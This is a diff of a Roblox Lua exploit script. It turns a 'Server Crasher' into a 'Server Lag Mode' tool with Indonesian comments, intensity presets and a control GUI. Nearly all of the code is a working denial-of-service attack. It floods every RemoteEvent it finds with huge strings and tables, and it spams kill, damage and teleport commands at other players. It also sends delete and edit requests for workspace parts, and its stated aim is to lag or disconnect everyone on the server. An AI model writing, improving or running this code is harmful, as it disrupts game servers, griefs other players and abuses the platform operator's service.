@@ -1,44 +1,82 @@
--- SERVER CRASHER - LAG & CRASH
--- ULTIMATE DESTRUCTION TOOL
--- Use with EXTREME CAUTION!
+-- SERVER LAG MODE - NETWORK OVERLOAD
+-- Bikin server lag sampai semua disconnect!
+-- BAHASA INDONESIA
 
 task.wait(2)
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
-local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui", 10)
 
--- Remove old GUI
-pcall(function()
-    if playerGui:FindFirstChild("CrasherGUI") then
-        playerGui.CrasherGUI:Destroy()
-        task.wait(0.5)
-    end
-end)
+if not playerGui then return end
+
+if playerGui:FindFirstChild("LagModeGUI") then
+    playerGui.LagModeGUI:Destroy()
+    task.wait(0.5)
+end
+
+-- ============================================
+-- SETTINGS
+-- ============================================
+local Settings = {
+    Intensity = "Medium", -- Low, Medium, High, EXTREME
+    Running = false,
+    PacketSize = 1000, -- Ukuran data per packet
+    Delay = 0.02, -- Delay antar spam
+}
+
+local IntensityConfig = {
+    Low = {
+        packetsPerCycle = 10,
+        dataSize = 500,
+        delay = 0.05,
+        remotesUsed = 5,
+    },
+    Medium = {
+        packetsPerCycle = 25,
+        dataSize = 1000,
+        delay = 0.02,
+        remotesUsed = 10,
+    },
+    High = {
+        packetsPerCycle = 50,
+        dataSize = 2000,
+        delay = 0.01,
+        remotesUsed = 20,
+    },
+    EXTREME = {
+        packetsPerCycle = 100,
+        dataSize = 5000,
+        delay = 0.005,
+        remotesUsed = 999,
+    }
+}
 
 -- ============================================
 -- VARIABLES
 -- ============================================
-local crashRunning = false
 local remotes = {}
-local crashConnections = {}
+local lagConnections = {}
+local packetsSent = 0
+local startTime = 0
 
 -- ============================================
 -- NOTIFICATION
 -- ============================================
-local function notif(msg, durasi)
+local function notif(msg, warna)
+    local icon = warna == "hijau" and "✅" or (warna == "merah" and "❌" or "⚡")
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Server Crasher";
-            Text = msg;
-            Duration = durasi or 3;
+            Title = "Server Lag Mode";
+            Text = icon .. " " .. msg;
+            Duration = 3;
         })
     end)
-    print("[Crasher]", msg)
+    print("[Lag Mode]", msg)
 end
 
 -- ============================================
@@ -47,7 +85,7 @@ end
 local function scanRemotes()
     remotes = {}
     
-    for _, service in pairs(game:GetChildren()) do
+    for _, service in pairs({ReplicatedStorage, Workspace}) do
         pcall(function()
             for _, obj in pairs(service:GetDescendants()) do
                 if obj:IsA("RemoteEvent") then
@@ -65,250 +103,259 @@ local function scanRemotes()
 end
 
 -- ============================================
--- CRASH METHODS
+-- LAG METHODS
 -- ============================================
 
--- Method 1: Spam RemoteEvents (Most effective)
-local function spamRemotes()
-    print("[CRASH] Spamming remotes...")
-    
-    local spamCount = 0
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Spam with massive data
-                for i = 1, 50 do
-                    remote:FireServer(string.rep("X", 10000)) -- Large string
-                    remote:FireServer({data = string.rep("CRASH", 1000)})
-                    remote:FireServer(table.create(1000, "spam"))
-                    spamCount = spamCount + 1
-                end
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-    return spamCount
-end
-
--- Method 2: Infinite Part Creation (Server memory overload)
-local function infiniteParts()
-    print("[CRASH] Creating infinite parts...")
+-- Method 1: Massive Data Spam
+local function massiveDataSpam()
+    local config = IntensityConfig[Settings.Intensity]
     
     local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
+        if not Settings.Running then return end
         
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Try to create parts via remotes
-                for i = 1, 100 do
-                    remote:FireServer("CreatePart", {
-                        Size = Vector3.new(1000, 1000, 1000),
-                        Position = Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
-                    })
-                    
-                    remote:FireServer("SpawnObject", "Part", Vector3.new(0, 999999, 0))
-                    
-                    remote:FireServer({
-                        Action = "Create",
-                        Type = "Part",
-                        Amount = 999999
-                    })
-                end
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 3: Physics Abuse (Lag generator)
-local function physicsAbuse()
-    print("[CRASH] Physics abuse...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
+        local remotesToUse = math.min(#remotes, config.remotesUsed)
         
-        -- Find all unanchored parts
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") and not obj.Anchored then
+        for i = 1, remotesToUse do
+            local remote = remotes[i]
+            if remote then
                 pcall(function()
-                    -- Apply extreme forces
-                    local bv = Instance.new("BodyVelocity")
-                    bv.Velocity = Vector3.new(math.random(-999999, 999999), math.random(-999999, 999999), math.random(-999999, 999999))
-                    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-                    bv.Parent = obj
-                    
-                    task.spawn(function()
-                        task.wait(0.1)
-                        pcall(function() bv:Destroy() end)
-                    end)
-                end)
-            end
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 4: Massive Remote Spam (Nuclear option)
-local function nuclearSpam()
-    print("[CRASH] NUCLEAR SPAM ACTIVATED!")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Maximum spam intensity
-                for i = 1, 200 do
-                    remote:FireServer(string.rep("NUKE", 5000))
-                    remote:FireServer({crash = table.create(5000, "OVERLOAD")})
-                    remote:FireServer(table.create(100, {data = string.rep("X", 1000)}))
-                end
-            end)
-        end
-        
-        -- Also spam all possible actions
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                remote:FireServer("Crash")
-                remote:FireServer("Lag")
-                remote:FireServer("Overload")
-                remote:FireServer({Action = "Crash"})
-                remote:FireServer({type = "overload", amount = 999999})
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 5: Mass Teleport Spam (TP abuse)
-local function teleportSpam()
-    print("[CRASH] Mass teleport spam...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        for _, remote in pairs(remotes) do
-            pcall(function()
-                -- Spam teleport commands
-                for i = 1, 100 do
-                    local randomPos = Vector3.new(
-                        math.random(-999999, 999999),
-                        math.random(-999999, 999999),
-                        math.random(-999999, 999999)
-                    )
-                    
-                    remote:FireServer("Teleport", player, randomPos)
-                    remote:FireServer("TP", player, randomPos)
-                    remote:FireServer({Action = "Teleport", Player = player, Position = randomPos})
-                    remote:FireServer("MoveTo", randomPos)
-                end
-            end)
-        end
-    end)
-    
-    table.insert(crashConnections, connection)
-end
-
--- Method 6: Exploit All Players (Multi-target)
-local function targetAllPlayers()
-    print("[CRASH] Targeting all players...")
-    
-    local connection = RunService.Heartbeat:Connect(function()
-        if not crashRunning then return end
-        
-        for _, plr in pairs(Players:GetPlayers()) do
-            for _, remote in pairs(remotes) do
-                pcall(function()
-                    -- Spam commands on all players
-                    for i = 1, 50 do
-                        remote:FireServer("Kill", plr)
-                        remote:FireServer("Damage", plr, 999999)
-                        remote:FireServer("Teleport", plr, Vector3.new(0, -999999, 0))
-                        remote:FireServer({Action = "Kill", Player = plr})
+                    for j = 1, config.packetsPerCycle do
+                        -- Kirim data besar
+                        local bigData = string.rep("LAG", config.dataSize)
+                        remote:FireServer(bigData)
+                        
+                        -- Kirim table besar
+                        local bigTable = table.create(config.dataSize, "OVERLOAD")
+                        remote:FireServer(bigTable)
+                        
+                        packetsSent = packetsSent + 2
                     end
                 end)
             end
         end
+        
+        task.wait(config.delay)
     end)
     
-    table.insert(crashConnections, connection)
+    table.insert(lagConnections, connection)
+end
+
+-- Method 2: Multi-Player Target Spam
+local function multiPlayerSpam()
+    local config = IntensityConfig[Settings.Intensity]
+    
+    local connection = RunService.Heartbeat:Connect(function()
+        if not Settings.Running then return end
+        
+        local allPlayers = Players:GetPlayers()
+        
+        for _, targetPlayer in ipairs(allPlayers) do
+            if targetPlayer ~= player then
+                for i = 1, math.min(#remotes, config.remotesUsed) do
+                    local remote = remotes[i]
+                    if remote then
+                        pcall(function()
+                            -- Spam berbagai command ke setiap player
+                            for j = 1, config.packetsPerCycle do
+                                local randomPos = Vector3.new(
+                                    math.random(-99999, 99999),
+                                    math.random(-99999, 99999),
+                                    math.random(-99999, 99999)
+                                )
+                                
+                                remote:FireServer("TP", targetPlayer, randomPos)
+                                remote:FireServer("Teleport", targetPlayer, randomPos)
+                                remote:FireServer({Action = "TP", Player = targetPlayer, Pos = randomPos})
+                                remote:FireServer("Kill", targetPlayer)
+                                remote:FireServer("Damage", targetPlayer, 999999)
+                                
+                                packetsSent = packetsSent + 5
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+        
+        task.wait(config.delay)
+    end)
+    
+    table.insert(lagConnections, connection)
+end
+
+-- Method 3: Workspace Spam
+local function workspaceSpam()
+    local config = IntensityConfig[Settings.Intensity]
+    
+    local connection = RunService.Heartbeat:Connect(function()
+        if not Settings.Running then return end
+        
+        -- Cari semua parts di workspace
+        local parts = {}
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and #parts < 100 then
+                table.insert(parts, obj)
+            end
+        end
+        
+        for i = 1, math.min(#remotes, config.remotesUsed) do
+            local remote = remotes[i]
+            if remote then
+                pcall(function()
+                    for _, part in ipairs(parts) do
+                        for j = 1, config.packetsPerCycle do
+                            -- Spam action ke parts
+                            remote:FireServer("Delete", part)
+                            remote:FireServer("Edit", part, "Position", Vector3.new(999999, 999999, 999999))
+                            remote:FireServer({Action = "Modify", Target = part, Data = string.rep("X", config.dataSize)})
+                            
+                            packetsSent = packetsSent + 3
+                        end
+                    end
+                end)
+            end
+        end
+        
+        task.wait(config.delay)
+    end)
+    
+    table.insert(lagConnections, connection)
+end
+
+-- Method 4: Mixed Payload Spam
+local function mixedPayloadSpam()
+    local config = IntensityConfig[Settings.Intensity]
+    
+    local connection = RunService.Heartbeat:Connect(function()
+        if not Settings.Running then return end
+        
+        for i = 1, math.min(#remotes, config.remotesUsed) do
+            local remote = remotes[i]
+            if remote then
+                pcall(function()
+                    for j = 1, config.packetsPerCycle do
+                        -- Mix berbagai jenis payload
+                        remote:FireServer(string.rep("NETWORK_OVERLOAD", config.dataSize))
+                        remote:FireServer({data = table.create(config.dataSize, "LAG")})
+                        remote:FireServer(table.create(100, {nested = string.rep("X", 100)}))
+                        
+                        -- Spam dengan argument random
+                        remote:FireServer(math.random(), math.random(), math.random())
+                        remote:FireServer(Vector3.new(math.random(), math.random(), math.random()))
+                        
+                        packetsSent = packetsSent + 5
+                    end
+                end)
+            end
+        end
+        
+        task.wait(config.delay)
+    end)
+    
+    table.insert(lagConnections, connection)
 end
 
 -- ============================================
--- MAIN CRASH FUNCTION
+-- MAIN FUNCTIONS
 -- ============================================
-local function startCrash()
-    if crashRunning then
-        notif("⚠️ Already running!", 2)
+
+local function startLag()
+    if Settings.Running then
+        notif("Sudah berjalan!", "merah")
         return
     end
     
-    crashRunning = true
-    notif("💥 SERVER CRASH STARTED!", 4)
+    Settings.Running = true
+    packetsSent = 0
+    startTime = tick()
     
-    -- Scan remotes first
     local remoteCount = scanRemotes()
     
     if remoteCount == 0 then
-        notif("❌ No remotes found!", 3)
-        crashRunning = false
+        notif("Tidak ada remote!", "merah")
+        Settings.Running = false
         return
     end
     
-    notif("🔥 Using " .. remoteCount .. " remotes!", 3)
-    
-    -- Activate ALL crash methods simultaneously
-    task.spawn(spamRemotes)
-    task.wait(0.1)
-    task.spawn(infiniteParts)
-    task.wait(0.1)
-    task.spawn(physicsAbuse)
-    task.wait(0.1)
-    task.spawn(nuclearSpam)
-    task.wait(0.1)
-    task.spawn(teleportSpam)
-    task.wait(0.1)
-    task.spawn(targetAllPlayers)
-    
-    notif("💣 ALL METHODS ACTIVE!", 4)
-    notif("⚠️ SERVER OVERLOAD IN PROGRESS...", 5)
+    notif("🔥 LAG MODE START!", "hijau")
+    notif("Intensity: " .. Settings.Intensity, nil)
+    notif("Remotes: " .. remoteCount, nil)
     
     print("================================")
-    print("CRASH METHODS ACTIVE:")
-    print("- Remote spam")
-    print("- Infinite parts")
-    print("- Physics abuse")
-    print("- Nuclear spam")
-    print("- Teleport spam")
-    print("- Multi-target")
+    print("SERVER LAG MODE ACTIVATED")
+    print("Intensity:", Settings.Intensity)
+    print("Remotes:", remoteCount)
+    print("Config:", IntensityConfig[Settings.Intensity])
     print("================================")
+    
+    -- Activate all methods
+    task.spawn(massiveDataSpam)
+    task.wait(0.1)
+    task.spawn(multiPlayerSpam)
+    task.wait(0.1)
+    task.spawn(workspaceSpam)
+    task.wait(0.1)
+    task.spawn(mixedPayloadSpam)
+    
+    notif("💥 Semua method aktif!", "hijau")
+    notif("⚠️ Server mulai overload...", nil)
+    
+    -- Monitor stats
+    task.spawn(function()
+        while Settings.Running do
+            task.wait(5)
+            local elapsed = math.floor(tick() - startTime)
+            local packetsPerSec = math.floor(packetsSent / math.max(elapsed, 1))
+            print(string.format("[Stats] Time: %ds | Packets: %d | Rate: %d/s", elapsed, packetsSent, packetsPerSec))
+        end
+    end)
 end
 
-local function stopCrash()
-    if not crashRunning then
-        notif("⚠️ Not running!", 2)
+local function stopLag()
+    if not Settings.Running then
+        notif("Tidak sedang berjalan!", "merah")
         return
     end
     
-    crashRunning = false
+    Settings.Running = false
     
-    -- Disconnect all connections
-    for _, connection in pairs(crashConnections) do
+    for _, connection in pairs(lagConnections) do
         pcall(function()
             connection:Disconnect()
         end)
     end
     
-    crashConnections = {}
+    lagConnections = {}
     
-    notif("⏸️ CRASH STOPPED", 3)
-    print("[CRASH] All methods stopped")
+    local elapsed = math.floor(tick() - startTime)
+    notif("⏸️ LAG STOPPED", "hijau")
+    notif("Packets sent: " .. packetsSent, nil)
+    notif("Duration: " .. elapsed .. "s", nil)
+    
+    print("================================")
+    print("LAG MODE STOPPED")
+    print("Total packets sent:", packetsSent)
+    print("Duration:", elapsed, "seconds")
+    print("================================")
+end
+
+local function setIntensity(level)
+    if Settings.Running then
+        notif("Stop dulu sebelum ganti!", "merah")
+        return
+    end
+    
+    Settings.Intensity = level
+    notif("Intensity: " .. level, "hijau")
+    
+    local config = IntensityConfig[level]
+    print("=== INTENSITY CONFIG ===")
+    print("Level:", level)
+    print("Packets per cycle:", config.packetsPerCycle)
+    print("Data size:", config.dataSize)
+    print("Delay:", config.delay)
+    print("Remotes used:", config.remotesUsed)
+    print("========================")
 end
 
 -- ============================================
@@ -316,29 +363,27 @@ end
 -- ============================================
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "CrasherGUI"
+ScreenGui.Name = "LagModeGUI"
 ScreenGui.ResetOnSpawn = false
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = playerGui
 
--- Main Frame (Compact design)
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 350, 0, 280)
-MainFrame.Position = UDim2.new(0.5, -175, 0.5, -140)
+MainFrame.Size = UDim2.new(0, 380, 0, 500)
+MainFrame.Position = UDim2.new(0.5, -190, 0.5, -250)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.Parent = ScreenGui
 
-local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 15)
-MainCorner.Parent = MainFrame
+local Corner = Instance.new("UICorner")
+Corner.CornerRadius = UDim.new(0, 15)
+Corner.Parent = MainFrame
 
 -- Header
 local Header = Instance.new("Frame")
 Header.Size = UDim2.new(1, 0, 0, 55)
-Header.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+Header.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
 Header.BorderSizePixel = 0
 Header.Parent = MainFrame
 
@@ -350,18 +395,17 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -70, 1, 0)
 Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "💥 SERVER CRASHER"
+Title.Text = "🔥 SERVER LAG MODE"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 20
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Header
 
--- Close Button
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Size = UDim2.new(0, 50, 0, 50)
 CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 0)
 CloseBtn.Text = "✕"
 CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseBtn.Font = Enum.Font.GothamBold
@@ -373,9 +417,9 @@ CloseBtnCorner.CornerRadius = UDim.new(0, 10)
 CloseBtnCorner.Parent = CloseBtn
 
 CloseBtn.MouseButton1Click:Connect(function()
-    stopCrash()
+    stopLag()
     ScreenGui:Destroy()
-    notif("👋 GUI Closed", 2)
+    notif("GUI ditutup", nil)
 end)
 
 -- Content
@@ -385,33 +429,85 @@ Content.Position = UDim2.new(0, 15, 0, 60)
 Content.BackgroundTransparency = 1
 Content.Parent = MainFrame
 
--- Crash Button (BIG RED)
-local CrashBtn = Instance.new("TextButton")
-CrashBtn.Size = UDim2.new(1, 0, 0, 70)
-CrashBtn.Position = UDim2.new(0, 0, 0, 0)
-CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
-CrashBtn.Text = "💣 CRASH SERVER"
-CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CrashBtn.Font = Enum.Font.GothamBold
-CrashBtn.TextSize = 24
-CrashBtn.Parent = Content
+-- Intensity Label
+local IntensityLabel = Instance.new("TextLabel")
+IntensityLabel.Size = UDim2.new(1, 0, 0, 35)
+IntensityLabel.Position = UDim2.new(0, 0, 0, 0)
+IntensityLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+IntensityLabel.Text = "⚡ PILIH INTENSITY"
+IntensityLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+IntensityLabel.Font = Enum.Font.GothamBold
+IntensityLabel.TextSize = 16
+IntensityLabel.Parent = Content
 
-local CrashBtnCorner = Instance.new("UICorner")
-CrashBtnCorner.CornerRadius = UDim.new(0, 12)
-CrashBtnCorner.Parent = CrashBtn
+local IntensityLabelCorner = Instance.new("UICorner")
+IntensityLabelCorner.CornerRadius = UDim.new(0, 10)
+IntensityLabelCorner.Parent = IntensityLabel
 
-CrashBtn.MouseButton1Click:Connect(function()
-    startCrash()
-    CrashBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-    CrashBtn.Text = "🔥 CRASHING..."
+-- Intensity Buttons
+local intensityButtons = {}
+local intensityLevels = {"Low", "Medium", "High", "EXTREME"}
+local intensityColors = {
+    Low = Color3.fromRGB(100, 200, 100),
+    Medium = Color3.fromRGB(255, 200, 0),
+    High = Color3.fromRGB(255, 100, 0),
+    EXTREME = Color3.fromRGB(255, 0, 0)
+}
+
+for i, level in ipairs(intensityLevels) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.48, 0, 0, 50)
+    btn.Position = UDim2.new((i-1) % 2 == 0 and 0 or 0.52, 0, 0, 40 + math.floor((i-1) / 2) * 55)
+    btn.BackgroundColor3 = intensityColors[level]
+    btn.Text = level
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 16
+    btn.Parent = Content
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = btn
+    
+    btn.MouseButton1Click:Connect(function()
+        setIntensity(level)
+        -- Update visual
+        for _, otherBtn in pairs(intensityButtons) do
+            otherBtn.BackgroundColor3 = intensityColors[otherBtn.Text]
+        end
+        btn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    end)
+    
+    table.insert(intensityButtons, btn)
+end
+
+-- Start Button
+local StartBtn = Instance.new("TextButton")
+StartBtn.Size = UDim2.new(1, 0, 0, 70)
+StartBtn.Position = UDim2.new(0, 0, 0, 160)
+StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+StartBtn.Text = "🚀 START LAG"
+StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+StartBtn.Font = Enum.Font.GothamBold
+StartBtn.TextSize = 24
+StartBtn.Parent = Content
+
+local StartBtnCorner = Instance.new("UICorner")
+StartBtnCorner.CornerRadius = UDim.new(0, 12)
+StartBtnCorner.Parent = StartBtn
+
+StartBtn.MouseButton1Click:Connect(function()
+    startLag()
+    StartBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    StartBtn.Text = "🔥 LAGGING..."
 end)
 
 -- Stop Button
 local StopBtn = Instance.new("TextButton")
 StopBtn.Size = UDim2.new(1, 0, 0, 60)
-StopBtn.Position = UDim2.new(0, 0, 0, 80)
-StopBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-StopBtn.Text = "⏸️ STOP CRASH"
+StopBtn.Position = UDim2.new(0, 0, 0, 240)
+StopBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+StopBtn.Text = "⏸️ STOP LAG"
 StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 StopBtn.Font = Enum.Font.GothamBold
 StopBtn.TextSize = 20
@@ -422,51 +518,58 @@ StopBtnCorner.CornerRadius = UDim.new(0, 12)
 StopBtnCorner.Parent = StopBtn
 
 StopBtn.MouseButton1Click:Connect(function()
-    stopCrash()
-    CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
-    CrashBtn.Text = "💣 CRASH SERVER"
+    stopLag()
+    StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+    StartBtn.Text = "🚀 START LAG"
 end)
 
--- Info Label
+-- Info
 local Info = Instance.new("TextLabel")
-Info.Size = UDim2.new(1, 0, 0, 60)
-Info.Position = UDim2.new(0, 0, 1, -60)
+Info.Size = UDim2.new(1, 0, 0, 120)
+Info.Position = UDim2.new(0, 0, 1, -120)
 Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-Info.TextColor3 = Color3.fromRGB(200, 200, 200)
+Info.TextColor3 = Color3.fromRGB(220, 220, 220)
 Info.Font = Enum.Font.Gotham
-Info.TextSize = 11
+Info.TextSize = 12
 Info.TextWrapped = true
-Info.Text = [[⚠️ WARNING: EXTREME TOOL!
+Info.TextYAlignment = Enum.TextYAlignment.Top
+Info.Text = [[🔥 SERVER LAG MODE
 
-Akan overload server dengan:
-• Remote spam (massive data)
-• Part creation flood
-• Physics abuse
-• Multi-method attack
+Bikin server overload sampai lag!
 
-Server bisa LAG PARAH atau CRASH!
+INTENSITY:
+• Low = Aman (test dulu)
+• Medium = Standard
+• High = Agresif
+• EXTREME = Max power!
 
-Use at your own risk!]]
+⚠️ Semua player akan lag!
+📊 Stats di console (F9)
+
+Network overload in progress...]]
 Info.Parent = Content
+
+local InfoPadding = Instance.new("UIPadding")
+InfoPadding.PaddingTop = UDim.new(0, 10)
+InfoPadding.PaddingLeft = UDim.new(0, 10)
+InfoPadding.PaddingRight = UDim.new(0, 10)
+InfoPadding.Parent = Info
 
 local InfoCorner = Instance.new("UICorner")
 InfoCorner.CornerRadius = UDim.new(0, 10)
 InfoCorner.Parent = Info
 
-local InfoPadding = Instance.new("UIPadding")
-InfoPadding.PaddingTop = UDim.new(0, 8)
-InfoPadding.PaddingLeft = UDim.new(0, 8)
-InfoPadding.PaddingRight = UDim.new(0, 8)
-InfoPadding.Parent = Info
+-- Auto scan
+task.spawn(function()
+    task.wait(1.5)
+    local count = scanRemotes()
+    notif("Ready! Found " .. count .. " remotes", "hijau")
+end)
 
--- Initial notification
-notif("💥 Server Crasher loaded!", 3)
+notif("🔥 Server Lag Mode loaded!", "hijau")
 print("================================")
-print("SERVER CRASHER")
+print("SERVER LAG MODE")
 print("PlaceId:", game.PlaceId)
-print("Ready to crash server!")
+print("Default Intensity: Medium")
+print("Ready to overload server!")
 print("================================")
-print("")
-print("⚠️ WARNING: EXTREME DESTRUCTION TOOL!")
-print("Use with EXTREME CAUTION!")
-print("")
